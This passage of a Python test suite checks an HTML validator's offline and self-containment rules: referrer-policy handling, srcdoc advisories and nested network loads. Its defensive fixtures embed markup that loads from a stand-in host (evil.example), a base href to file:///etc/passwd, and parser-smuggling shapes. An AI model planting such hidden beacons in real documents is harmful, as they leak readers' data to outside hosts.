        # offline document that frames nothing (or frames a local file) is untouched, and so is an
        # ordinary `srcdoc`-free document.
        for markup in ("<iframe></iframe>", '<iframe src="local.html" title="t"></iframe>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], errors)
                self.assertEqual(warnings, [], warnings)

    def test_a_srcdoc_is_not_an_error_outside_offline_mode(self):
        # Shareable mode makes no zero-network promise and its export runs no offline strip, so
        # the REJECTION stays scoped to the mode whose contract it belongs to. The authoring-time
        # warning below is the separate, non-blocking half.
        markup = '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertFalse(any("srcdoc" in e for e in errors), errors)

    def test_offline_mode_rejects_a_permissive_element_referrer_policy(self):
        # CMH-OFFLINE-10. The export removes every `referrerpolicy` attribute, because a
        # per-element policy overrides the document one for that request - so a permissive one
        # planted on an anchor defeats the `no-referrer` meta beside it and hands the document's
        # own URL to whatever the reader clicks. The gate had no matching rule at all, so a
        # hand-authored offline document carrying one validated clean.
        for markup in ('<a href="local.html" referrerpolicy="unsafe-url">x</a>',
                       '<a href="local.html" REFERRERPOLICY="Unsafe-URL">x</a>',
                       '<img src="local.png" alt="x" referrerpolicy="origin">',
                       '<iframe src="local.html" referrerpolicy="no-referrer-when-downgrade"></iframe>',
                       '<link rel="icon" href="local.png" referrerpolicy="unsafe-url">',
                       '<template><a href="local.html" referrerpolicy="unsafe-url">x</a></template>',
                       '<noscript><a href="local.html" referrerpolicy="unsafe-url">x</a></noscript>',
                       '<svg><a href="local.html" referrerpolicy="unsafe-url"/></svg>',
                       '<script src="local.js" referrerpolicy="unsafe-url"></script>',
                       '<map name="m"><area href="local.html" referrerpolicy="unsafe-url"></map>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "referrerpolicy" in e for e in errors),
                                "expected an offline referrerpolicy error for %r, got %r"
                                % (markup, errors))

    def test_offline_mode_accepts_an_element_policy_a_browser_does_not_honour(self):
        # The controls the rule is measured by, every one of them checked in a real Chromium
        # (`element.referrerPolicy` is the empty string - the invalid value state - for all four of
        # the rejected spellings below, so each sets NO policy and the document's own stays in
        # force). `referrerpolicy` is an ENUMERATED attribute: it is not trimmed, and the legacy
        # meta aliases are not keywords for it. A policy that restates `no-referrer` weakens
        # nothing either, and neither does the attribute on an element that issues no request - a
        # `<div>`, and the three SVG-only fetchers SVG2 lists the attribute on but a real Chromium
        # exposes no `referrerPolicy` for at all (`image`, `use`, `feImage` - measured, the IDL
        # attribute is absent), so nothing there honours it. Nor does one on an `a`/`area` whose
        # `rel` carries `noreferrer` (HTML sets that navigation's referrer to
        # no-referrer whatever the attribute says). The far more common control is last: a
        # document that carries no such attribute at all, which is what the export itself emits.
        for markup in ('<a href="local.html" referrerpolicy="no-referrer">x</a>',
                       '<a href="local.html" referrerpolicy="No-Referrer">x</a>',
                       '<a href="local.html" referrerpolicy="always">x</a>',
                       '<a href="local.html" referrerpolicy=" unsafe-url ">x</a>',
                       '<a href="local.html" referrerpolicy="">x</a>',
                       '<a href="local.html" referrerpolicy="bogus-policy">x</a>',
                       '<a href="local.html" rel="noreferrer" referrerpolicy="unsafe-url">x</a>',
                       '<a href="local.html" rel="NOREFERRER noopener" referrerpolicy="unsafe-url">x</a>',
                       '<map name="m"><area href="local.html" rel="noreferrer" referrerpolicy="unsafe-url"></map>',
                       '<div referrerpolicy="unsafe-url">x</div>',
                       '<svg><image href="local.png" referrerpolicy="unsafe-url"/></svg>',
                       '<svg><use href="local.svg#i" referrerpolicy="unsafe-url"/></svg>',
                       '<svg><filter><feImage href="local.png" referrerpolicy="unsafe-url"/></filter></svg>',
                       '<svg><a href="local.html" referrerpolicy="no-referrer"/></svg>',
                       '<a href="local.html">x</a>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], errors)
                self.assertEqual(warnings, [], warnings)

    def test_offline_mode_rejects_a_permissive_referrer_meta(self):
        # The document-level half of the same surface. The export replaces an authored referrer
        # meta with `no-referrer` rather than merging it, because the LAST referrer meta a document
        # declares wins. Every permissive one is reported rather than only the effective one: the
        # flat tag index cannot tell a live meta from a `<template>`-parked one, so letting a later
        # `no-referrer` suppress an earlier permissive meta could be masked by an inert meta, and
        # the export removes every one of them anyway.
        for markup in ('<meta name="referrer" content="unsafe-url">',
                       '<meta name="referrer" content="always">',
                       '<meta name="referrer" content="origin-when-crossorigin">',
                       '<meta name="Referrer" content="Strict-Origin-When-Cross-Origin">',
                       '<meta name="referrer" content="unsafe-url"><meta name="referrer" content="no-referrer">',
                       '<template><meta name="referrer" content="unsafe-url"></template>',
                       '<noscript><meta name="referrer" content="unsafe-url"></noscript>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "referrer" in e for e in errors),
                                "expected an offline referrer-meta error for %r, got %r"
                                % (markup, errors))

    def test_offline_mode_accepts_a_referrer_meta_a_browser_does_not_honour(self):
        # The export's own output must validate: it writes exactly one `no-referrer` meta, and a
        # document that declares none at all is what every other offline test here carries. The
        # rest are values a real Chromium was MEASURED setting no policy from - a referrer meta is
        # not the HTTP header, so its content is neither split on commas nor trimmed, and an
        # unknown value simply sets nothing (each of these documents fell back to the browser
        # default cross-origin rather than to the token in the value). The `referrer-policy`
        # pragma is here for the same reason: it is not an HTML pragma directive and the same
        # measurement showed Chromium ignoring it entirely, so it can weaken nothing.
        for markup in ('<meta name="referrer" content="no-referrer">',
                       '<meta name="referrer" content="never">',
                       '<meta name="referrer" content="no-referrer, unsafe-url">',
                       '<meta name="referrer" content="unsafe-url, no-referrer">',
                       '<meta name="referrer" content=" unsafe-url ">',
                       '<meta name="referrer" content=" origin-when-crossorigin ">',
                       '<meta name="referrer" content="">',
                       '<meta name="referrer" content="not-a-policy">',
                       '<meta http-equiv="referrer-policy" content="unsafe-url">'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], errors)
                self.assertEqual(warnings, [], warnings)

    def test_the_referrer_surface_is_left_alone_outside_offline_mode(self):
        # Scoped to the mode whose contract it belongs to, like every other rule here: a shareable
        # export runs no offline strip and makes no zero-network promise.
        for markup in ('<a href="local.html" referrerpolicy="unsafe-url">x</a>',
                       '<meta name="referrer" content="unsafe-url">'):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertFalse(any("referrer" in e for e in errors), errors)

    def test_the_referrer_policy_readings_match_what_a_browser_honours(self):
        # The two readings are deliberately DIFFERENT grammars, so pin each directly rather than
        # only through the gate. Every expectation here was measured in a real Chromium: the
        # attribute is an enumerated one (exact token, ASCII case-insensitive, no trim, no legacy
        # alias), while a referrer meta folds HTML's legacy aliases but is neither split on commas
        # nor trimmed. Sharing one parser between them - which an earlier revision of this rule did
        # - reported two documents a browser treats as carrying no policy at all.
        for value, expected in (("unsafe-url", "unsafe-url"), ("UNSAFE-URL", "unsafe-url"),
                                ("no-referrer", "no-referrer"), (" unsafe-url ", ""),
                                ("always", ""), ("never", ""), ("", ""), (None, ""),
                                ("no-referrer, unsafe-url", ""), ("bogus", "")):
            with self.subTest(attr=value):
                self.assertEqual(resources.referrer_policy_attr(value), expected)
        for value, expected in (("unsafe-url", "unsafe-url"), ("UNSAFE-URL", "unsafe-url"),
                                ("no-referrer", "no-referrer"), ("always", "unsafe-url"),
                                ("never", "no-referrer"), ("default", "no-referrer-when-downgrade"),
                                ("origin-when-crossorigin", "origin-when-cross-origin"),
                                ("ORIGIN-WHEN-CROSSORIGIN", "origin-when-cross-origin"),
                                (" unsafe-url ", ""), ("no-referrer, unsafe-url", ""),
                                ("unsafe-url, no-referrer", ""), ("unsafe-url, never", ""),
                                ("", ""), (None, ""), ("bogus", "")):
            with self.subTest(meta=value):
                self.assertEqual(resources.referrer_meta_policy(value), expected)
    def test_a_srcdoc_warns_that_an_offline_export_will_remove_it(self):
        # CMH-VAL-24: the decision (issue #1080) is to KEEP the clear-outright rule rather than
        # sanitize the nested document, so the author's cost is real - Export Offline empties the
        # frame. What they had was a transient toast AFTER the export. This warns while they are
        # still AUTHORING, so the trade is announced rather than discovered. PRESENCE is the test,
        # exactly like the offline error, so nothing here parses the nested document and the two
        # sides still agree by construction.
        for markup in ('<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>',
                       '<iframe srcdoc="" title="t"></iframe>',
                       "<iframe srcdoc></iframe>"):
            with self.subTest(markup=markup):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual(errors, [], errors)
                self.assertTrue(any("srcdoc" in w and "Export Offline" in w for w in warnings),
                                "expected a srcdoc offline-export warning for %r, got %r"
                                % (markup, warnings))

    def test_the_srcdoc_offline_warning_reaches_a_parked_frame(self):
        # CMH-VAL-24: the same shapes the offline error is held to - a `<template>` the export
        # walks into, a `<noscript>` fallback, and a self-closed foreign element - because the
        # warning has to describe the same set of frames the export will really empty.
        for markup in ('<template><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe></template>',
                       '<noscript><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe></noscript>',
                       '<svg><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"/></svg>'):
            with self.subTest(markup=markup):
                _, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("srcdoc" in w and "Export Offline" in w for w in warnings),
                                "expected a srcdoc offline-export warning for %r, got %r"
                                % (markup, warnings))

    def test_a_frame_without_a_srcdoc_draws_no_offline_warning(self):
        # CMH-VAL-24 control: the warning is about the nested document, not about the element, so
        # a frame that carries none is silent.
        for markup in ("<iframe></iframe>", '<iframe src="local.html" title="t"></iframe>'):
            with self.subTest(markup=markup):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual(errors, [], errors)
                self.assertFalse(any("srcdoc" in w for w in warnings), warnings)

    def test_the_srcdoc_advisory_says_the_markup_is_kept_as_inert_text(self):
        # CMH-VAL-24 / CMH-OFFLINE-04 (issue #1119): the export no longer drops the nested document
        # on the floor - it keeps the markup beside the emptied frame as escaped inert text - so an
        # advisory that still said the content was removed outright would send an author off to
        # duplicate by hand exactly what the export already preserves. The notice stays (the frame
        # really does stop RENDERING the nested document), but it must describe what survives.
        _, warnings = self._errs_warns(
            build(body=self._body(MAIN, '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>')))
        notices = [w for w in warnings if "srcdoc" in w]
        self.assertEqual(len(notices), 1, warnings)
        self.assertIn("inert", notices[0])
        self.assertNotIn("removes outright", notices[0])

    def test_the_srcdoc_advisory_promises_nothing_kept_for_an_empty_value(self):
        # CMH-VAL-24: the exporter keeps NOTHING for an empty or whitespace-only `srcdoc` (there is
        # no nested document), and that case is trivially visible to this tokenizer - so promising
        # preserved markup here would describe behavior the exporter does not have, the one-sided
        # rule CMH-OFFLINE-04 exists to prevent. The frame is still reported: the attribute goes on
        # PRESENCE, so the author still needs to know an offline copy will not carry it.
        for markup in ('<iframe srcdoc=""></iframe>',
                       "<iframe srcdoc></iframe>",
                       '<iframe srcdoc="  &#10; "></iframe>',
                       # Every character of the shared ASCII class, including the ones the engines'
                       # own trims disagree about at the edges.
                       '<iframe srcdoc="&#9;&#10;&#12;&#13; "></iframe>'):
            with self.subTest(markup=markup):
                _, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                notices = [w for w in warnings if "srcdoc" in w]
                self.assertEqual(len(notices), 1, warnings)
                self.assertIn("no nested document to keep", notices[0])
                self.assertNotIn("kept beside it", notices[0])

    def test_the_srcdoc_emptiness_test_is_the_exporters_ascii_class_not_the_engines(self):
        # CMH-VAL-24 parity: `str.strip()` also takes U+001C-U+001F and U+0085 while JS `trim()`
        # also takes NBSP and U+FEFF, so the two engines' defaults disagreed in BOTH directions on
        # real values and the advisory promised a block the exporter never inserted (and denied one
        # it did). Both sides now read the literal HTML ASCII set, so a value carrying anything else
        # is CONTENT here exactly as it is to the exporter's `_OFFLINE_SRCDOC_CONTENT_RE`.
        for markup in ('<iframe srcdoc="&#xFEFF;"></iframe>',       # JS trim() would take this
                       '<iframe srcdoc="&#28;"></iframe>',          # str.strip() would take this
                       '<iframe srcdoc="&#160;"></iframe>',         # NBSP: trimmed by JS, not here
                       '<iframe srcdoc="&#133;"></iframe>'):        # U+0085: stripped by Python
            with self.subTest(markup=markup):
                _, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                notices = [w for w in warnings if "srcdoc" in w]
                self.assertEqual(len(notices), 1, warnings)
                self.assertIn("kept beside it", notices[0])
                self.assertNotIn("no nested document to keep", notices[0])

    def test_an_offline_document_reports_the_srcdoc_once_as_an_error(self):
        # CMH-VAL-24: an offline document is past the point the advisory is useful - the export
        # already ran and the file is being certified - so the two must not double-report. The
        # ERROR is the whole answer there.
        markup = '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>'
        doc = with_offline_mode(build(body=self._body(MAIN, markup)))
        errors, warnings = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "srcdoc" in e for e in errors), errors)
        self.assertFalse(any("srcdoc" in w for w in warnings), warnings)

    def test_the_srcdoc_notice_is_an_advisory_not_a_blocking_warning(self):
        # CMH-VAL-24: the CHANNEL is the whole point, and asserting only that the string lands in
        # `warnings` cannot see it. A BLOCKING warning fails `--strict`, withholds the validated
        # stamp (so the runtime "not validated" banner stays up on every run) and makes a
        # fail-closed caller such as retrofit refuse to write - which would make DELETING the
        # nested document the only route to a clean run, the exact loss this notice exists to
        # announce. A `srcdoc` is legitimate content in a mode that makes no zero-network promise,
        # so it must be an advisory instead.
        markup = '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>'
        _, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
        notice = [w for w in warnings if "srcdoc" in w]
        self.assertEqual(len(notice), 1, warnings)
        self.assertTrue(validate.is_advisory(notice[0]), notice)
        fatal, advisory = validate.partition_warnings(warnings)
        self.assertIn(notice[0], advisory)
        self.assertEqual(fatal, [], fatal)

    def test_the_srcdoc_advisory_reports_on_one_line(self):
        # CMH-VAL-24: a `srcdoc` carries a whole DOCUMENT, so it is almost always multi-line, and
        # the CLI prints one report per line - the raw value would split a single finding across
        # untagged lines. The non-whitespace C0 controls `str.split()` leaves alone go too: an ESC
        # in authored text on its way to a terminal starts an ANSI escape sequence. The offline
        # ERROR shares the treatment, so it is pinned here too - the spec row promises both, and
        # a revert of either side alone must fail.
        markup = ('<iframe srcdoc="&lt;p&gt;one&lt;/p&gt;\n\r\t&lt;p&gt;two\x1b[31m\x07\x00'
                  '&lt;/p&gt;"></iframe>')
        body = self._body(MAIN, markup)
        _, warnings = self._errs_warns(build(body=body))
        notice = [w for w in warnings if "srcdoc" in w]
        errors, _ = self._errs_warns(with_offline_mode(build(body=body)))
        offline = [e for e in errors if "srcdoc" in e]
        self.assertEqual(len(notice), 1, warnings)
        self.assertEqual(len(offline), 1, errors)
        for label, reports in (("advisory", notice), ("offline error", offline)):
            for ch in ("\n", "\r", "\t", "\x1b", "\x07", "\x00"):
                self.assertNotIn(ch, reports[0], "%s: %r" % (label, reports[0]))

    def test_a_srcdoc_beside_a_malformed_descriptor_is_still_only_an_advisory(self):
        # CMH-VAL-24: the branch is "not known to be OFFLINE", not "known to be SHAREABLE" - a
        # document whose layer descriptor is missing or malformed lands there too. That is
        # harmless rather than wrong, because the descriptor rule errors on it independently, but
        # the advisory must not become the thing that blocks such a document beyond that error.
        markup = '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe>'
        doc = build(body=self._body(MAIN, markup)).replace(
            '"mode": "shareable"', '"mode": "shareable"  <<< not json')
        _, warnings = self._errs_warns(doc)
        notice = [w for w in warnings if "srcdoc" in w]
        self.assertEqual(len(notice), 1, warnings)
        self.assertTrue(validate.is_advisory(notice[0]), notice)

    def test_a_srcdoc_document_still_passes_strict_and_is_still_stamped(self):
        # CMH-VAL-24, end to end: the advisory classification only matters if the GATE honors it.
        # A shareable document carrying a `srcdoc` must stay strict-clean and must still receive
        # the validated stamp, or an author who embeds a demo frame can never hand the file off.
        markup = '<iframe srcdoc="&lt;p&gt;x&lt;/p&gt;" title="demo"></iframe>'
        content = build(body=self._body(MAIN, markup))
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "doc.html")
            with open(p, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            r = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            # Keyed to the PREFIX `ADVISORY_PREFIXES` itself reads, not to the loose substring
            # "srcdoc": an error line or a strict-failure banner would carry that too.
            self.assertIn(validate.SRCDOC_ADVISORY_PREFIX, r.stdout)
            self.assertNotIn("FAILED", r.stdout)
            with open(p, "r", encoding="utf-8", newline="") as fh:
                stamped = fh.read()
        # The exact meta, not a prefix of it: `commentable-html-validated-hash` also contains
        # `commentable-html-validated`, so a substring test would pass with no timestamp stamp.
        self.assertIn('name="commentable-html-validated"', stamped,
                      "an advisory must not withhold the validated stamp")

    def test_a_network_load_inside_a_srcdoc_is_an_error_outside_offline_mode(self):
        # CMH-VAL-25: the self-contained guarantee was enforced against every spelling of a
        # network load EXCEPT one - a load carried inside a nested document, which the tag index
        # reads as attribute TEXT. The byte-identical load written as an element is a hard error
        # in every mode, so a shareable file could carry a validated stamp and still phone home.
        # Every load-bearing pair the top-level rules enforce is read the same way inside the
        # frame, through the SAME shared index on the nested value as a FRAGMENT.
        # Each case asserts the DISCRIMINATING clause, not just the host name: the shared label
        # echoes the nested document, so a bare "evil.example" substring is satisfied by the label
        # alone and every finding kind would satisfy it interchangeably.
        for nested, clause in (
                ("&lt;img src=//evil.example/x.png&gt;",
                 'carries a nested <img src="//evil.example/x.png">'),
                ("&lt;img srcset=&quot;//evil.example/x.png 1x&quot;&gt;",
                 'carries a nested <img srcset="//evil.example/x.png">'),
                ("&lt;script src=&quot;https://evil.example/x.js&quot;&gt;&lt;/script&gt;",
                 'carries a nested <script src="https://evil.example/x.js">'),
                ("&lt;script href=&quot;https://evil.example/x.js&quot;&gt;&lt;/script&gt;",
                 'carries a nested <script href="https://evil.example/x.js">'),
                ("&lt;script xlink:href=&quot;https://evil.example/x.js&quot;&gt;&lt;/script&gt;",
                 'carries a nested <script xlink:href="https://evil.example/x.js">'),
                ("&lt;iframe src=&quot;https://evil.example/x.html&quot;&gt;&lt;/iframe&gt;",
                 'carries a nested <iframe src="https://evil.example/x.html">'),
                ("&lt;base href=&quot;https://evil.example/&quot;&gt;",
                 'carries a nested <base href="https://evil.example/">')):
            markup = '<iframe srcdoc="%s"></iframe>' % nested
            with self.subTest(nested=nested):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any(clause in e for e in errors),
                                "expected %r in a nested-load error for %r, got %r"
                                % (clause, nested, errors))

    def test_a_nested_network_link_is_a_warning_like_the_top_level_one(self):
        # CMH-VAL-25: the SEVERITY mirrors the top-level rule element for element. A network
        # `<link>` is a WARNING at the top level, so the nested spelling is a warning too - a
        # non-advisory warning still fails `--strict` and withholds the stamp, but a plain run must
        # not report the nested spelling more harshly than the identical top-level element. Pinned
        # against the TOP-LEVEL behavior in the same test so the two can never drift apart.
        link = '<link rel="stylesheet" href="https://evil.example/x.css">'
        top_errors, top_warnings = self._errs_warns(build(body=self._body(MAIN, link)))
        self.assertEqual([e for e in top_errors if "evil.example" in e], [])
        self.assertTrue(any("evil.example" in w for w in top_warnings), top_warnings)
        markup = ('<iframe srcdoc="&lt;link rel=stylesheet '
                  'href=&quot;https://evil.example/x.css&quot;&gt;"></iframe>')
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
        clause = 'carries a nested <link href="https://evil.example/x.css">'
        self.assertFalse(any(clause in e for e in errors), errors)
        notice = [w for w in warnings if clause in w]
        self.assertEqual(len(notice), 1, warnings)
        # A warning, but NOT an advisory: it must still fail --strict and withhold the stamp.
        self.assertFalse(validate.is_advisory(notice[0]), notice)

    def test_a_srcdoc_that_reaches_no_network_stays_clean(self):
        # CMH-VAL-25 control, and the reason this reads the nested value through the shared tag
        # index rather than scanning its raw text: a text scan cannot tell an `<a href>` (which is
        # NAVIGATION and exempt at the top level) or a URL written in prose from a real load, so it
        # would block benign nested markup. A relative reference, a `data:` URI and a non-loading
        # `<link>` are all as legitimate inside a frame as outside one.
        for nested in ("&lt;a href=&quot;https://example.com/&quot;&gt;docs&lt;/a&gt;",
                       "&lt;p&gt;see https://example.com/ for more&lt;/p&gt;",
                       "&lt;img src=&quot;x.png&quot;&gt;",
                       "&lt;img src=&quot;data:image/png;base64,AAAA&quot;&gt;",
                       "&lt;img srcset=&quot;data:text/plain,https://h/p 1x&quot;&gt;",
                       "&lt;link rel=&quot;canonical&quot; href=&quot;https://example.com/&quot;&gt;",
                       "&lt;base href=&quot;sub/&quot;&gt;"):
            markup = '<iframe srcdoc="%s"></iframe>' % nested
            with self.subTest(nested=nested):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual(errors, [], "%r should not error, got %r" % (nested, errors))
                self.assertEqual([w for w in warnings if not validate.is_advisory(w)], [],
                                 "%r should draw no blocking warning, got %r" % (nested, warnings))

    def test_a_doubly_escaped_nested_document_stays_inert_text(self):
        # CMH-VAL-25: exactly ONE decode per nesting level. A value escaped TWICE is text a browser
        # renders rather than markup it builds, so the walk must not report it - an extra decode
        # pass would invent a load that no browser performs, which is the false-positive direction
        # this rule cannot afford. The control for the two-frames-deep test below.
        markup = ('<iframe srcdoc="&amp;lt;img src=//evil.example/x.png&amp;gt;">'
                  "</iframe>")
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertEqual(errors, [], errors)
        self.assertEqual([w for w in warnings if not validate.is_advisory(w)], [], warnings)

    def test_the_srcdoc_network_rule_reaches_a_parked_frame(self):
        # CMH-VAL-25: read off the same shared EGRESS index as every other rule here, so a
        # `<template>`-parked frame, a `<noscript>` fallback and a self-closed foreign element are
        # all judged alike - a hole in any of them is a hole in the guarantee.
        nested = "&lt;img src=//evil.example/x.png&gt;"
        clause = 'carries a nested <img src="//evil.example/x.png">'
        for markup in ('<template><iframe srcdoc="%s"></iframe></template>' % nested,
                       '<noscript><iframe srcdoc="%s"></iframe></noscript>' % nested,
                       '<svg><iframe srcdoc="%s"/></svg>' % nested):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any(clause in e for e in errors),
                                "expected a nested-load error for %r, got %r" % (markup, errors))

    def test_the_nested_read_inherits_the_shared_index_smuggling_rules(self):
        # CMH-VAL-25: the nested document is read through the SAME index as the top-level one, so
        # the shapes CMH-VAL-21 already settled there - a `<![CDATA[` bogus comment, and raw text
        # inside a FOREIGN `<script>`/`<style>` (which is not raw text at all) - must be seen
        # inside a frame too. Pinning the integration, not the shared parser: a nested read that
        # ever grew its own tokenizer would regress exactly this.
        clause = 'carries a nested <img src="//evil.example/x.png">'
        for nested in ("&lt;![CDATA[&gt;&lt;img src=//evil.example/x.png&gt;]]&gt;",
                       "&lt;svg&gt;&lt;script&gt;&lt;img src=//evil.example/x.png&gt;"
                       "&lt;/script&gt;&lt;/svg&gt;",
                       "&lt;svg&gt;&lt;style&gt;&lt;img src=//evil.example/x.png&gt;"
                       "&lt;/style&gt;&lt;/svg&gt;"):
            markup = '<iframe srcdoc="%s"></iframe>' % nested
            with self.subTest(nested=nested):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any(clause in e for e in errors),
                                "expected a nested-load error for %r, got %r" % (nested, errors))

    def test_a_load_nested_two_frames_deep_is_an_error(self):
        # CMH-VAL-25: a frame inside a frame is one more spelling of the same load, so the walk
        # follows the nesting instead of stopping at the first level.
        inner = "&amp;lt;img src=//evil.example/x.png&amp;gt;"
        markup = '<iframe srcdoc="&lt;iframe srcdoc=&quot;%s&quot;&gt;&lt;/iframe&gt;"></iframe>' % inner
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any('carries a nested <img src="//evil.example/x.png">' in e
                            for e in errors), errors)

    def test_a_nested_chartjs_cdn_script_is_not_exempt(self):
        # CMH-VAL-25: the top-level Chart.js CDN exemption exists for the ONE documented opt-in -
        # the loader that draws this document's canvas charts. A copy parked inside a nested
        # document can never be that loader (a frame cannot draw into its host's canvas), so the
        # exemption has nothing to exempt and does not travel with the spelling. A deliberate
        # strictness difference, not an oversight.
        src = "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"
        nested = "&lt;script src=&quot;%s&quot;&gt;&lt;/script&gt;" % src
        markup = '<iframe srcdoc="%s"></iframe>' % nested
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any('carries a nested <script src="%s">' % src in e for e in errors),
                        errors)

    def test_an_offline_document_reports_the_srcdoc_presence_alone(self):
        # CMH-VAL-25: offline mode already refuses a `srcdoc` on PRESENCE, which is strictly
        # stronger than refusing the loads inside it, so the two must not double-report the same
        # frame. Offline behavior is unchanged by this rule.
        markup = '<iframe srcdoc="&lt;img src=//evil.example/x.png&gt;"></iframe>'
        doc = with_offline_mode(build(body=self._body(MAIN, markup)))
        errors, _ = self._errs_warns(doc)
        srcdoc_errors = [e for e in errors if "srcdoc" in e]
        self.assertEqual(len(srcdoc_errors), 1, errors)
        self.assertIn("offline mode", srcdoc_errors[0])

    def test_a_srcdoc_network_load_fails_strict_and_is_not_stamped(self):
        # CMH-VAL-25 end to end: the finding blocks, so `--strict` fails and the
        # `commentable-html-validated` stamp is withheld - the whole point is that a recipient
        # cannot be handed a stamped file that fetches from a host. Both severities are pinned:
        # the `img` ERROR and the `link` WARNING, because a non-advisory warning must fail
        # `--strict` exactly as the error does. Contrast
        # `test_a_srcdoc_document_still_passes_strict_and_is_still_stamped`, where the frame
        # carries no load and only the advisory fires.
        for markup in ('<iframe srcdoc="&lt;img src=//evil.example/x.png&gt;"></iframe>',
                       '<iframe srcdoc="&lt;link rel=stylesheet '
                       'href=&quot;https://evil.example/x.css&quot;&gt;"></iframe>'):
            with self.subTest(markup=markup):
                content = build(body=self._body(MAIN, markup))
                with tempfile.TemporaryDirectory() as d:
                    p = os.path.join(d, "doc.html")
                    with open(p, "w", encoding="utf-8", newline="") as fh:
                        fh.write(content)
                    r = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p],
                                       capture_output=True, text=True)
                    self.assertNotEqual(r.returncode, 0, r.stdout + r.stderr)
                    self.assertIn("evil.example", r.stdout)
                    with open(p, "r", encoding="utf-8", newline="") as fh:
                        stamped = fh.read()
                self.assertNotIn('name="commentable-html-validated"', stamped,
                                 "a nested network load must withhold the validated stamp")

    def test_a_nested_document_that_cannot_be_read_fails_closed(self):
        # CMH-VAL-25: an empty answer from the nested lookup must mean "nothing loads", never
        # "could not look". The nested value below is one the shared tolerant parse cannot build an
        # index for, so the guard is what stands between it and a clean report - deleting the guard
        # makes this test fail rather than leaving it green. Asserted on the DISCRIMINATING clause,
        # since the shared label puts "srcdoc" on every finding kind.
        nested = ("&lt;noscript&gt;&lt;style&gt;/* &lt;/noscript&gt; */ "
                  "body{background:url(https://evil.example/b.png)}&lt;/style&gt;"
                  "&lt;/noscript&gt;")
        markup = '<iframe srcdoc="%s"></iframe>' % nested
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any("could not be parsed" in e for e in errors), errors)

    def test_a_nested_base_is_held_to_the_stricter_non_local_predicate(self):
        # CMH-VAL-25: a nested `<base href>` is judged by `offline_is_non_local_ref`, not by the
        # `//`-requiring network predicate the per-resource rules use - a base rebases EVERY
        # relative reference in the nested document, so a scheme the fetch predicate ignores still
        # takes the whole nested document off the file. The `ftp:` and `file:` cases are what
        # discriminate: they are non-local under that predicate and NOT network URLs, so swapping
        # the two predicates cannot leave the suite green. The two `https:` spellings are network
        # URLs under both and ride along as authority-form controls.
        for href in ("ftp://evil.example/", "file:///etc/passwd", "https:evil.example/",
                     "https:/\\evil.example/"):
            markup = ('<iframe srcdoc="&lt;base href=&quot;%s&quot;&gt;"></iframe>'
                      % href.replace("&", "&amp;"))
            with self.subTest(href=href):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("carries a nested <base href=" in e for e in errors),
                                "expected a nested-base error for %r, got %r" % (href, errors))

    def test_the_nested_read_reads_the_frame_the_outer_parse_built(self):
        # CMH-VAL-25: the nested walk sees exactly the value the OUTER document parse produced, so
        # the boundary between the two parses is pinned rather than assumed. A character reference
        # (hex, decimal, and the unterminated decimal form a browser still consumes) becomes markup;
        # a single-quoted outer value carries the frame just as a double-quoted one does; and a
        # frame carrying BOTH a `srcdoc` and a `src` is still read through its `srcdoc`, which is
        # what a browser renders.
        clause = 'carries a nested <img src="//evil.example/x.png">'
        for markup in ('<iframe srcdoc="&#x3c;img src=//evil.example/x.png&#x3e;"></iframe>',
                       '<iframe srcdoc="&#60;img src=//evil.example/x.png&#62;"></iframe>',
                       "<iframe srcdoc='&lt;img src=//evil.example/x.png&gt;'></iframe>",
